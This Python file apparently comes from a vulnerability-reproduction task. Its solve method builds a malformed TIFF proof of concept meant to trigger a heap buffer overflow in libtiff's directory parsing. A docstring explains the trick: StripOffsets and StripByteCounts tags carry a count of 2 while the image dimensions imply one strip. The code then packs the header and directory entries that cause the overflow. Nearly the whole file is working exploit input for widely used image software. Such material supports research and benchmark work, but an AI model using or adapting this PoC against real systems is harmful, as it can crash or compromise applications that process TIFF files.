import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a heap buffer overflow in libtiff's directory parsing logic.
        It can be triggered when a TIFF file contains strip-related tags (like
        StripOffsets or StripByteCounts) whose 'count' field mismatches the
        number of strips calculated from the image dimensions.

        This PoC constructs a TIFF file with the following properties:
        1.  Image dimensions (ImageLength=1, RowsPerStrip=1) that lead the library
            to expect nstrips = 1. Based on this, it allocates buffers for strip
            information (offsets, byte counts) sized for a single strip.
        2.  A StripOffsets tag and a StripByteCounts tag are included, but with a
            'count' of 2. This creates a mismatch.
        3.  A vulnerable version of libtiff handles this mismatch by updating its
            internal strip count to 2, but it fails to reallocate the buffers
            which are still sized for 1 strip.
        4.  The library then attempts to read 2 elements (8 bytes) into the
            4-byte buffer, causing a heap buffer overflow.
        5.  The tags are made "offline" (data stored elsewhere in the file) by
            ensuring their data size (count * type_size = 2 * 4 = 8 bytes) is
            larger than 4 bytes. The offset to this data is set to 0, an invalid
            value that typically causes the library to read from the beginning of
            the file.
        """
        
        # TIFF Header (8 bytes)
        # Byte Order: 'II' for Little Endian
        # Version: 42 (0x002a)
        # Offset to first IFD: 8 (immediately after the header)
        poc = b'II\x2a\x00\x08\x00\x00\x00'

        # Image File Directory (IFD)
        # Number of entries in this directory. We use 8 tags.
        num_entries = 8
        poc += struct.pack('<H', num_entries)

        # Directory Entries (12 bytes each, format: Tag, Type, Count, Value/Offset)
        # We define a minimal set of tags for a basic striped image.
        
        # Tag 256: ImageWidth, Type SHORT, Count 1, Value 1
        poc += struct.pack('<HHII', 256, 3, 1, 1)
        # Tag 257: ImageLength, Type SHORT, Count 1, Value 1
        poc += struct.pack('<HHII', 257, 3, 1, 1)
        # Tag 258: BitsPerSample, Type SHORT, Count 1, Value 8
        poc += struct.pack('<HHII', 258, 3, 1, 8)
        # Tag 259: Compression, Type SHORT, Count 1, Value 1 (None)
        poc += struct.pack('<HHII', 259, 3, 1, 1)
        # Tag 262: PhotometricInterpretation, Type SHORT, Count 1, Value 1 (BlackIsZero)
        poc += struct.pack('<HHII', 262, 3, 1, 1)
        # Tag 278: RowsPerStrip, Type LONG, Count 1, Value 1
        poc += struct.pack('<HHII', 278, 4, 1, 1)

        # Malicious Tags that trigger the overflow
        # Tag 273: StripOffsets, Type LONG, Count 2, Offset 0
        poc += struct.pack('<HHII', 273, 4, 2, 0)
        # Tag 279: StripByteCounts, Type LONG, Count 2, Offset 0
        poc += struct.pack('<HHII', 279, 4, 2, 0)

        # Offset to the next IFD (4 bytes)
        # A value of 0 indicates this is the last IFD.
        poc += struct.pack('<I', 0)
        
        return poc